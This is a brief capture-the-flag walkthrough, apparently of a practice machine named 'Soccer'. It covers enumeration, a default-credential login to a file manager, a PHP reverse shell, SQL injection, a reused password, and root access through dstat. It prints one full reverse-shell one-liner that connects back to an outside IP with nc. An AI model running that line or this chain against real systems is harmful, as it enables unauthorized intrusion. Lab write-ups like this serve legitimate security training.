+++
title = 'Soccer'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan
![Soccer (Easy Linux).png](Soccer%20%28Easy%20Linux%29.png)

Port 80 - the webpage doesn't seem to load at all - can't really do anything
Port 9091 - GET OPTIONS POST TRACE all don't work...

Nmap output has ssh version and nginx version
nginx version is old but doesn't seem like there's any rce exploit
ssh 

![Soccer (Easy Linux)-1.png](Soccer%20%28Easy%20Linux%29-1.png)
ffuf reveals directory "tiny"

It seems that this was the issue around why browser was hanging:

![Soccer (Easy Linux)-2.png](Soccer%20%28Easy%20Linux%29-2.png)

Main site is completely static, going to /tiny there's a login portal

![Soccer (Easy Linux)-3.png](Soccer%20%28Easy%20Linux%29-3.png)
In the github readme
![Soccer (Easy Linux)-4.png](Soccer%20%28Easy%20Linux%29-4.png)
logged in
![Soccer (Easy Linux)-5.png](Soccer%20%28Easy%20Linux%29-5.png)

![Soccer (Easy Linux)-6.png](Soccer%20%28Easy%20Linux%29-6.png)
It is the web root of the site, and its php so we can obtain a shell

![Soccer (Easy Linux)-7.png](Soccer%20%28Easy%20Linux%29-7.png)
`system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 80 >/tmp/f");`

![Soccer (Easy Linux)-8.png](Soccer%20%28Easy%20Linux%29-8.png)
![Soccer (Easy Linux)-9.png](Soccer%20%28Easy%20Linux%29-9.png)
![Soccer (Easy Linux)-10.png](Soccer%20%28Easy%20Linux%29-10.png)
Boolean based sqli
![Soccer (Easy Linux)-11.png](Soccer%20%28Easy%20Linux%29-11.png)

Using sqlmap we see soccer_db which has `player@player.htb` and password `PlayerOftheMatch2022`

The password works for player user through ssh
![Soccer (Easy Linux)-12.png](Soccer%20%28Easy%20Linux%29-12.png)

linpeas
![Soccer (Easy Linux)-13.png](Soccer%20%28Easy%20Linux%29-13.png)

![Soccer (Easy Linux)-14.png](Soccer%20%28Easy%20Linux%29-14.png)

able to execute dstat as root - looking at gtfo bins shows how this can be abused to elevate privileges
![Soccer (Easy Linux)-15.png](Soccer%20%28Easy%20Linux%29-15.png)

